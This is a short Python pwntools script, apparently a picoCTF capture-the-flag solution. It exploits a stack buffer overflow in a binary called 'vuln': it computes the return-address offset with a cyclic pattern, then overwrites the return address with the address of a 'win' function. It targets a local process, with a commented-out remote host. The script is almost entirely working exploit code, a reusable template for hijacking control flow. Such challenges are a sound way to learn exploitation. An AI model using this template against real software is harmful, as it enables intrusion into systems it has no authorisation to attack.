from pwn import *

BINARY_PATH = './vuln'
TARGET_FUNCTION_NAME = 'win'
REMOTE_IP = 'saturn.picoctf.net'
REMOTE_PORT = 55581

payload = cyclic(250)
f = open("payload.txt", "w")
f.write(payload)
f.close()

# gdb$ r < payload.txt

# replace 0x6161616c with the value of the register you want to override
offset = cyclic_find(p32(0x6161616c))
print("OFFSET", offset)

# find target function address
binary = ELF(BINARY_PATH)
target_function_address = p32(binary.symbols[TARGET_FUNCTION_NAME])
print(f"Target function \"{TARGET_FUNCTION_NAME}\" at", target_function_address)

# generate payload
payload = cyclic(offset) + target_function_address
print("Payload:", payload)

# send to process / remote
r = process(BINARY_PATH) # remote(REMOTE_IP, REMOTE_PORT)
r.sendline(payload)
r.interactive()
